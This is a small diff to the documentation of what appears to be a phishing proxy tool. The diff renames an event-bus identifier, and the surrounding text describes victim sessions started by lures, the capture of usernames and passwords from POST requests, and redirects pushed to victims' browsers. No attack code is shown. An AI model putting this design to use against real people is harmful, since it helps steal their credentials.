@@ -31,7 +31,7 @@ parameters embedded in the phishing URL's ?p= query value.
 
 A [Session] is created when a victim first hits a lure. It progresses
 through three observable states, each of which publishes an event to
-the [EventBus]:
+the [eventBus]:
 
  1. Created   — [EventSessionCreated]    — victim loaded the phishing page
  2. Creds     — [EventCredsCaptured]     — username/password captured from a POST
@@ -45,7 +45,7 @@ session done and publishes [EventSessionCompleted].
 
 # Event bus
 
-[EventBus] is the publish/subscribe interface that decouples the proxy
+[eventBus] is the publish/subscribe interface that decouples the proxy
 pipeline from other components. The WebSocket hub subscribes to
 [EventSessionCompleted] to fan the redirect URL out to waiting browsers.
 Publish must never block; if a subscriber's channel is full the event is
